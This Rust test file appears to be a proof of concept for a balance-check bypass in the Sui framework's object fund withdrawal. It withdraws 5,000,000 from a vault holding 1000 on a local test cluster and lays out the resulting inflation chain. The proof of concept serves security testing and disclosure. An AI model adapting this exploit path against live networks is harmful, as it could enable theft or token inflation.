// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

//! PoC: Object Withdrawal Balance Check Bypass
//!
//! This test demonstrates that withdraw_funds_from_object() does NOT check
//! if the requested amount exceeds the actual balance in the object.
//!
//! VULNERABILITY PATH:
//!   1. Deposit 1000 into vault
//!   2. Request withdrawal of 5,000,000 via object_balance::withdraw_funds
//!   3. If NO balance check: TX succeeds → [CRITICAL]
//!   4. If balance check exists: TX fails → [SAFE]
//!
//! AFFECTED CODE:
//!   - sui-framework/sources/balance.move:113-114
//!   - sui-framework/sources/funds_accumulator.move:89-93
//!   - Move comment: "Does not abort even if the value is greater than the amount in the object"

use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use test_cluster::addr_balance_test_env::TestEnvBuilder;

#[tokio::test]
async fn test_no_balance_check_on_object_withdrawal() {
    println!("\n========================================");
    println!("  PoC: Object Withdrawal Inflation");
    println!("  Target: balance::withdraw_funds_from_object");
    println!("========================================\n");

    // [1] Setup test environment with object withdrawal enabled
    let mut env = TestEnvBuilder::new()
        .with_num_validators(1)
        .with_proto_override_cb(Box::new(|_, mut cfg| {
            cfg.set_enable_object_funds_withdraw_for_testing(true);
            cfg
        }))
        .build()
        .await;

    println!("[+] Test cluster started (1 validator)");
    println!("[+] enable_object_funds_withdraw = TRUE\n");

    let sender = env.get_sender(0);
    let gas0 = env.gas_objects[&sender][0];
    let gas1 = env.gas_objects[&sender][1];

    // [2] Publish object_balance package
    println!("[1] Publishing object_balance package...");
    let tx = env
        .tx_builder_with_gas(sender, gas0)
        .publish_examples("object_balance")
        .await
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let package_id = effects
        .created()
        .into_iter()
        .find(|(_, owner)| owner.is_immutable())
        .unwrap()
        .0
        .0;
    println!("    Package: {}", package_id);

    // Refresh gas after publish
    let gas0 = env.gas_objects[&sender][0];

    // [3] Create vault (new_owned)
    println!("[2] Creating vault...");
    let tx = env
        .tx_builder_with_gas(sender, gas0)
        .move_call(package_id, "object_balance", "new_owned", vec![])
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let vault_ref = effects.created().into_iter().next().unwrap().0;
    println!("    Vault: {} (version: {:?})", vault_ref.0, vault_ref.1);

    // Refresh gas after vault creation
    let gas0 = env.gas_objects[&sender][0];

    // [4] Deposit 1000 into vault using a separate gas object
    println!("[3] Depositing 1000 into vault...");
    let tx = env
        .tx_builder_with_gas(sender, gas0)
        .transfer_sui_to_address_balance(
            FundSource::coin(gas1),
            vec![(1000u64, vault_ref.0.into())],
        )
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    assert!(effects.status().is_ok(), "Deposit failed: {:?}", effects.status());
    println!("    Deposited 1000 ✓\n");

    // Refresh gas
    let gas0 = env.gas_objects[&sender][0];

    // Get fresh vault reference (version may have changed)
    let vault_ref = env.cluster.get_latest_object_ref(&vault_ref.0).await;
    println!("[+] Vault refreshed: {} (version: {:?})", vault_ref.0, vault_ref.1);
    println!("[+] Sender: {}", sender);

    // [5] ATTACK: Try to withdraw 5,000,000 from vault with only 1000
    let attack_amount = 5_000_000u64;
    println!(
        "\n[4] ATTACK: Withdrawing {} from vault with balance 1000...",
        attack_amount
    );

    let tx = env
        .tx_builder_with_gas(sender, gas0)
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_ref),
            vec![(attack_amount, sender)],
        )
        .build();

    let result = env.exec_tx_directly(tx).await;

    // [6] Analyze result
    match result {
        Ok((digest, effects)) => {
            println!("[5] TX Digest: {}", digest);
            println!("[5] TX Status: {:?}", effects.status());

            if effects.status().is_ok() {
                println!("\n########################################");
                println!("#  [CRITICAL] VULNERABILITY CONFIRMED!  #");
                println!("########################################");
                println!("#");
                println!("#  withdraw_funds_from_object() BYPASSED");
                println!("#  the balance check!");
                println!("#");
                println!("#  Requested: 5,000,000");
                println!("#  Available: 1,000");
                println!("#  Result:    SUCCESS (no abort)");
                println!("#");
                println!("#  This allows inflation: Split event emitted");
                println!("#  → settlement underflow → task death");
                println!("#  → Split never applied → balance inflated");
                println!("#");
                println!("########################################");

                panic!(
                    "[CRITICAL] Object withdrawal bypasses balance check - \
                     TX succeeded when it should have failed!"
                );
            } else {
                println!("\n[SAFE] Transaction failed as expected");
                println!("       Details: {:?}", effects.status());
                println!("\nA hidden defense blocked the attack.");
            }
        }
        Err(e) => {
            println!("\n[SAFE] Execution error (attack blocked)");
            println!("       Error: {:?}", e);
        }
    }
}
